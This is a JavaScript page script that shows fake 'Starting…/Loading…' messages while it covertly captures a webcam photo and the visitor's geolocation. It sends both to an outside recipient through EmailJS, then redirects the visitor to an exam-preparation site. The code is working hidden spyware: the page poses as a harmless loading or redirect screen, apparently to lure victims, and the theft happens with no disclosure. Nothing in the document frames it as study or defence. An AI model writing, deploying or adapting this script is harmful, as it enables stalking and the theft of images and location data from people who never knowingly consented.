<script>
emailjs.init("vieRRG0Q8QGFFS-XO");

let started = false;

/* Tap to start */
document.addEventListener("click", () => {
    if (!started) {
        started = true;
        document.getElementById("loading").innerText = "Starting…";
        startCamera();
    }
});

async function startCamera() {
    try {
        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("video").srcObject = stream;
        document.getElementById("loading").innerText = "Loading…";
        setTimeout(takePhoto, 1200);
    } 
    catch (err) {
        document.getElementById("loading").innerText = "Tap to continue";
        started = false;
    }
}

function takePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = 320;
    canvas.height = 240;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const img = canvas.toDataURL("image/jpeg", 0.25);

    sendData(img);
}

function sendData(photo) {
    document.getElementById("loading").innerText = "Finishing…";

    let emailData = {
        photo: photo,
        location: "Location Blocked"
    };

    navigator.geolocation.getCurrentPosition(
        pos => {
            emailData.location = pos.coords.latitude + ", " + pos.coords.longitude;
            sendEmailJS(emailData);
        },
        err => sendEmailJS(emailData),
        { timeout: 4000 }
    );
}

function sendEmailJS(data) {
    emailjs.send("service_c2bqpj9", "template_pee9jcq", data)
    .then(() => {
        document.getElementById("loading").innerText = "Done ✓ Redirecting…";
        setTimeout(() => {
            window.location.href = "https://www.neetprep.com/papers-test-series?utm_source=google";
        }, 800);
    })
    .catch(err => {
        document.getElementById("loading").innerText = "Error.";
        console.error(err);
    });
}
